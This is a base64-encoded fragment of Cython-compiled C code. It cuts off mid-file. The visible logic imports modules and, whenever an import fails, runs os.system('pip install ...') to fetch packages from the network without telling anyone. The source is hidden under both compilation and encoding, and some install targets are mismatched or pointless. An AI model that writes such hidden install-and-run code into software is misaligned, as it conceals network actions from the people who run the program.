UigwLCAyMywgX19weXhfTDIwX2V4Y2VwdF9lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTEpOwogICAgICBfX3B5eF90XzkgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfMTEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zeXN0ZW0pOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfOSkpIF9fUFlYX0VSUigwLCAyMywgX19weXhfTDIwX2V4Y2VwdF9lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfOSk7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzExKTsgX19weXhfdF8xMSA9IDA7CiAgICAgIF9fcHl4X3RfNiA9IDE7CiAgICAgIHsKICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8xMCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9waXBfaW5zdGFsbF9iczR9OwogICAgICAgIF9fcHl4X3RfNCA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfOSwgX19weXhfY2FsbGFyZ3MrX19weXhfdF82LCAoMi1fX3B5eF90XzYpIHwgKF9fcHl4X3RfNipfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDsKICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF85KTsgX19weXhfdF85ID0gMDsKICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAyMywgX19weXhfTDIwX2V4Y2VwdF9lcnJvcikKICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTsKICAgICAgfQogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwogICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKICAgICAgZ290byBfX3B5eF9MMTlfZXhjZXB0aW9uX2hhbmRsZWQ7CiAgICB9CgogICAgCiAgICBfX3B5eF9MMjBfZXhjZXB0X2Vycm9yOjsKICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMSk7CiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzcpOwogICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF84KTsKICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfMSwgX19weXhfdF83LCBfX3B5eF90XzgpOwogICAgZ290byBfX3B5eF9MMV9lcnJvcjsKICAgIF9fcHl4X0wxOV9leGNlcHRpb25faGFuZGxlZDo7CiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzEpOwogICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF83KTsKICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfOCk7CiAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzEsIF9fcHl4X3RfNywgX19weXhfdF84KTsKICAgIF9fcHl4X0wyM190cnlfZW5kOjsKICB9CgogIAogIHsKICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfZGVjbGFyZQogICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9hc3NpZ24KICAgIF9fUHl4X0V4Y2VwdGlvblNhdmUoJl9fcHl4X3RfOCwgJl9fcHl4X3RfNywgJl9fcHl4X3RfMSk7CiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfOCk7CiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNyk7CiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMSk7CiAgICAgewoKICAgICAgCiAgICAgIF9fcHl4X3RfMiA9IF9fUHl4X0ltcG9ydERvdHRlZE1vZHVsZShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfanNvbiwgTlVMTCk7IGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDI1LCBfX3B5eF9MMjZfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpOwogICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2pzb24sIF9fcHl4X3RfMikgPCAoMCkpIF9fUFlYX0VSUigwLCAyNSwgX19weXhfTDI2X2Vycm9yKQogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKCiAgICAgIAogICAgICBfX3B5eF90XzIgPSBfX1B5eF9JbXBvcnREb3R0ZWRNb2R1bGUoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JlLCBOVUxMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgMjYsIF9fcHl4X0wyNl9lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7CiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmUsIF9fcHl4X3RfMikgPCAoMCkpIF9fUFlYX0VSUigwLCAyNiwgX19weXhfTDI2X2Vycm9yKQogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKCiAgICAgIAogICAgICBfX3B5eF90XzIgPSBfX1B5eF9JbXBvcnREb3R0ZWRNb2R1bGUoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X29zLCBOVUxMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgMjcsIF9fcHl4X0wyNl9lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7CiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfb3MsIF9fcHl4X3RfMikgPCAoMCkpIF9fUFlYX0VSUigwLCAyNywgX19weXhfTDI2X2Vycm9yKQogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKCiAgICAgIAogICAgICBfX3B5eF90XzIgPSBfX1B5eF9JbXBvcnREb3R0ZWRNb2R1bGUoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3N5cywgTlVMTCk7IGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDI4LCBfX3B5eF9MMjZfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpOwogICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3N5cywgX19weXhfdF8yKSA8ICgwKSkgX19QWVhfRVJSKDAsIDI4LCBfX3B5eF9MMjZfZXJyb3IpCiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwoKICAgICAgCiAgICB9CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7CiAgICBnb3RvIF9fcHl4X0wzMV90cnlfZW5kOwogICAgX19weXhfTDI2X2Vycm9yOjsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzExKTsgX19weXhfdF8xMSA9IDA7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOSk7IF9fcHl4X3RfOSA9IDA7CgogICAgCiAgICAgewogICAgICBfX1B5eF9BZGRUcmFjZWJhY2soIm5lIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7CiAgICAgIGlmIChfX1B5eF9HZXRFeGNlcHRpb24oJl9fcHl4X3RfMiwgJl9fcHl4X3RfNSwgJl9fcHl4X3RfMykgPCAwKSBfX1BZWF9FUlIoMCwgMjksIF9fcHl4X0wyOF9leGNlcHRfZXJyb3IpCiAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8yKTsKICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzUpOwogICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMyk7CgogICAgICAKICAgICAgX19weXhfdF85ID0gTlVMTDsKICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzEwLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfb3MpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTApKSBfX1BZWF9FUlIoMCwgMzAsIF9fcHl4X0wyOF9leGNlcHRfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEwKTsKICAgICAgX19weXhfdF8xMSA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF8xMCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3N5c3RlbSk7IGlmICh1bmxpa2VseSghX19weXhfdF8xMSkpIF9fUFlYX0VSUigwLCAzMCwgX19weXhfTDI4X2V4Y2VwdF9lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTEpOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwOwogICAgICBfX3B5eF90XzYgPSAxOwogICAgICB7CiAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfOSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9waXBfaW5zdGFsbF9qc29ufTsKICAgICAgICBfX3B5eF90XzQgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzExLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzYsICgyLV9fcHl4X3RfNikgfCAoX19weXhfdF82Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF85KTsgX19weXhfdF85ID0gMDsKICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwOwogICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDMwLCBfX3B5eF9MMjhfZXhjZXB0X2Vycm9yKQogICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpOwogICAgICB9CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwogICAgICBnb3RvIF9fcHl4X0wyN19leGNlcHRpb25faGFuZGxlZDsKICAgIH0KCiAgICAKICAgIF9fcHl4X0wyOF9leGNlcHRfZXJyb3I6OwogICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF84KTsKICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfNyk7CiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzEpOwogICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF84LCBfX3B5eF90XzcsIF9fcHl4X3RfMSk7CiAgICBnb3RvIF9fcHl4X0wxX2Vycm9yOwogICAgX19weXhfTDI3X2V4Y2VwdGlvbl9oYW5kbGVkOjsKICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfOCk7CiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzcpOwogICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xKTsKICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfOCwgX19weXhfdF83LCBfX3B5eF90XzEpOwogICAgX19weXhfTDMxX3RyeV9lbmQ6OwogIH0KCiAgCiAgewogICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9kZWNsYXJlCiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2Fzc2lnbgogICAgX19QeXhfRXhjZXB0aW9uU2F2ZSgmX19weXhfdF8xLCAmX19weXhfdF83LCAmX19weXhfdF84KTsKICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xKTsKICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF83KTsKICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF84KTsKICAgICB7CgogICAgICAKICAgICAgX19weXhfdF8zID0gX19QeXhfUHlMaXN0X1BhY2soMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2RhdGV0aW1lKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgMzIsIF9fcHl4X0wzNF9lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7CiAgICAgIF9fcHl4X3RfNSA9IF9fUHl4X0ltcG9ydChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZGF0ZXRpbWUsIF9fcHl4X3RfMywgMCk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDMyLCBfX3B5eF9MMzRfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKICAgICAgX19weXhfdF8zID0gX19QeXhfSW1wb3J0RnJvbShfX3B5eF90XzUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9kYXRldGltZSk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDMyLCBfX3B5eF9MMzRfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpOwogICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2RhdGV0aW1lLCBfX3B5eF90XzMpIDwgKDApKSBfX1BZWF9FUlIoMCwgMzIsIF9fcHl4X0wzNF9lcnJvcikKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwoKICAgICAgCiAgICB9CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7CiAgICBnb3RvIF9fcHl4X0wzOV90cnlfZW5kOwogICAgX19weXhfTDM0X2Vycm9yOjsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzExKTsgX19weXhfdF8xMSA9IDA7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOSk7IF9fcHl4X3RfOSA9IDA7CgogICAgCiAgICAgewogICAgICBfX1B5eF9BZGRUcmFjZWJhY2soIm5lIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7CiAgICAgIGlmIChfX1B5eF9HZXRFeGNlcHRpb24oJl9fcHl4X3RfNSwgJl9fcHl4X3RfMywgJl9fcHl4X3RfMikgPCAwKSBfX1BZWF9FUlIoMCwgMzMsIF9fcHl4X0wzNl9leGNlcHRfZXJyb3IpCiAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF81KTsKICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzMpOwogICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMik7CgogICAgICAKICAgICAgX19weXhfdF8xMSA9IE5VTEw7CiAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF85LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfb3MpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfOSkpIF9fUFlYX0VSUigwLCAzNCwgX19weXhfTDM2X2V4Y2VwdF9lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfOSk7CiAgICAgIF9fcHl4X3RfMTAgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfOSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3N5c3RlbSk7IGlmICh1bmxpa2VseSghX19weXhfdF8xMCkpIF9fUFlYX0VSUigwLCAzNCwgX19weXhfTDM2X2V4Y2VwdF9lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTApOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF85KTsgX19weXhfdF85ID0gMDsKICAgICAgX19weXhfdF82ID0gMTsKICAgICAgewogICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzExLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X3BpcF9pbnN0YWxsX3JlfTsKICAgICAgICBfX3B5eF90XzQgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzEwLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzYsICgyLV9fcHl4X3RfNikgfCAoX19weXhfdF82Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwOwogICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7CiAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMzQsIF9fcHl4X0wzNl9leGNlcHRfZXJyb3IpCiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7CiAgICAgIH0KICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwogICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CiAgICAgIGdvdG8gX19weXhfTDM1X2V4Y2VwdGlvbl9oYW5kbGVkOwogICAgfQoKICAgIAogICAgX19weXhfTDM2X2V4Y2VwdF9lcnJvcjo7CiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzEpOwogICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF83KTsKICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfOCk7CiAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzEsIF9fcHl4X3RfNywgX19weXhfdF84KTsKICAgIGdvdG8gX19weXhfTDFfZXJyb3I7CiAgICBfX3B5eF9MMzVfZXhjZXB0aW9uX2hhbmRsZWQ6OwogICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xKTsKICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfNyk7CiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzgpOwogICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF8xLCBfX3B5eF90XzcsIF9fcHl4X3RfOCk7CiAgICBfX3B5eF9MMzlfdHJ5X2VuZDo7CiAgfQoKICAKICB7CiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2RlY2xhcmUKICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfYXNzaWduCiAgICBfX1B5eF9FeGNlcHRpb25TYXZlKCZfX3B5eF90XzgsICZfX3B5eF90XzcsICZfX3B5eF90XzEpOwogICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzgpOwogICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzcpOwogICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzEpOwogICAgIHsKCiAgICAgIAogICAgICBfX3B5eF90XzIgPSBfX1B5eF9QeUxpc3RfUGFjaygxLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZ2VuZXJhdGVfdXNlcl9hZ2VudCk7IGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDM2LCBfX3B5eF9MNDJfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpOwogICAgICBfX3B5eF90XzMgPSBfX1B5eF9JbXBvcnQoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3VzZXJfYWdlbnRfMiwgX19weXhfdF8yLCAwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgMzYsIF9fcHl4X0w0Ml9lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwogICAgICBfX3B5eF90XzIgPSBfX1B5eF9JbXBvcnRGcm9tKF9fcHl4X3RfMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2dlbmVyYXRlX3VzZXJfYWdlbnQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCAzNiwgX19weXhfTDQyX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTsKICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9nZW5lcmF0ZV91c2VyX2FnZW50LCBfX3B5eF90XzIpIDwgKDApKSBfX1BZWF9FUlIoMCwgMzYsIF9fcHl4X0w0Ml9lcnJvcikKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwoKICAgICAgCiAgICB9CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7CiAgICBnb3RvIF9fcHl4X0w0N190cnlfZW5kOwogICAgX19weXhfTDQyX2Vycm9yOjsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzExKTsgX19weXhfdF8xMSA9IDA7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOSk7IF9fcHl4X3RfOSA9IDA7CgogICAgCiAgICAgewogICAgICBfX1B5eF9BZGRUcmFjZWJhY2soIm5lIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7CiAgICAgIGlmIChfX1B5eF9HZXRFeGNlcHRpb24oJl9fcHl4X3RfMywgJl9fcHl4X3RfMiwgJl9fcHl4X3RfNSkgPCAwKSBfX1BZWF9FUlIoMCwgMzcsIF9fcHl4X0w0NF9leGNlcHRfZXJyb3IpCiAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8zKTsKICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzIpOwogICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNSk7CgogICAgICAKICAgICAgX19weXhfdF8xMCA9IE5VTEw7CiAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8xMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X29zKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzExKSkgX19QWVhfRVJSKDAsIDM4LCBfX3B5eF9MNDRfZXhjZXB0X2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMSk7CiAgICAgIF9fcHl4X3RfOSA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF8xMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3N5c3RlbSk7IGlmICh1bmxpa2VseSghX19weXhfdF85KSkgX19QWVhfRVJSKDAsIDM4LCBfX3B5eF9MNDRfZXhjZXB0X2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF85KTsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTEpOyBfX3B5eF90XzExID0gMDsKICAgICAgX19weXhfdF82ID0gMTsKICAgICAgewogICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzEwLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X3BpcF9pbnN0YWxsX3VzZXJfYWdlbnR9OwogICAgICAgIF9fcHl4X3RfNCA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfOSwgX19weXhfY2FsbGFyZ3MrX19weXhfdF82LCAoMi1fX3B5eF90XzYpIHwgKF9fcHl4X3RfNipfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDsKICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF85KTsgX19weXhfdF85ID0gMDsKICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAzOCwgX19weXhfTDQ0X2V4Y2VwdF9lcnJvcikKICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTsKICAgICAgfQogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwogICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICAgICAgZ290byBfX3B5eF9MNDNfZXhjZXB0aW9uX2hhbmRsZWQ7CiAgICB9CgogICAgCiAg